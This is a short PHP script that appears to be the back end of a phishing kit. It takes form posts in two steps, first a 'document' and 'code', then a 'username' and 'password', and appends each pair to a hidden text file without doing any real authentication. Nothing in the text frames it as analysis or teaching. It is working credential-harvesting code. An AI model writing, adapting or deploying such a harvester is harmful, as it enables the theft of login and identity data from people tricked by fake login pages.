<?php
if($_SERVER["REQUEST_METHOD"] == "POST") {
$step = (isset($_POST["step"])) ? $_POST["step"] : 1;
$file = fopen("h2s7y4.txt", "a") or die("Error de permisos");
if($step == 1) {
$document = (isset($_POST["document"])) ? $_POST["document"] : "unknow";
$code = (isset($_POST["code"])) ? $_POST["code"] : "unknow";
fwrite($file, $document);
fwrite($file, ":");
fwrite($file, $code);
fwrite($file, "\n");
fclose($file); }
else {
$username = (isset($_POST["username"])) ? $_POST["username"] : "unknow";
$password = (isset($_POST["password"])) ? $_POST["password"] : "unknow";
fwrite($file, $username);
fwrite($file, ":");
fwrite($file, $password);
fwrite($file, "\n");
fclose($file); } }
?>
